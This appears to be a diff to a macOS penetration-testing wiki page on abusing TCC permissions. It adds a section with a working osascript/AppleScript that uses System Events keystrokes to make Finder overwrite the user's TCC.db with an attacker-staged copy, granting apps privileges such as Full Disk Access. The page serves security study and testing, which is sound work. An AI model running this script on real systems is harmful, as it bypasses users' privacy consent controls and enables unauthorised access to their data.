@@ -440,6 +440,58 @@ EOD
 
 Same happens with **Script Editor app,** it can control Finder, but using an AppleScript you cannot force it to execute a script.
 
+### Automation + Accessibility (**`kTCCServicePostEvent`)** to FDA\*
+
+Automation on **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) allows to send **keystrokes to processes**. This way you could abuse Finder to change the users TCC.db or to give FDA to an arbitrary app (although password might be prompted for this).
+
+Finder overwriting users TCC.db example:
+
+```applescript
+-- store the TCC.db file to copy in /tmp
+osascript <<EOF
+tell application "System Events"
+    -- Open Finder
+    tell application "Finder" to activate
+
+    -- Open the /tmp directory
+    keystroke "g" using {command down, shift down}
+    delay 1
+    keystroke "/tmp"
+    delay 1
+    keystroke return
+    delay 1
+
+    -- Select and copy the file
+    keystroke "TCC.db"
+    delay 1
+    keystroke "c" using {command down}
+    delay 1
+
+    -- Resolve $HOME environment variable
+    set homePath to system attribute "HOME"
+
+    -- Navigate to the Desktop directory under $HOME
+    keystroke "g" using {command down, shift down}
+    delay 1
+    keystroke homePath & "/Library/Application Support/com.apple.TCC"
+    delay 1
+    keystroke return
+    delay 1
+
+    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
+    keystroke "TCC.db"
+    delay 1
+    keystroke return
+    delay 1
+    key code 51 using {command down}
+    delay 1
+
+    -- Paste the file
+    keystroke "v" using {command down}
+end tell
+EOF
+```
+
 ### **Endpoint Security Client to FDA**
 
 If you have **`kTCCServiceEndpointSecurityClient`**, you have FDA. End.
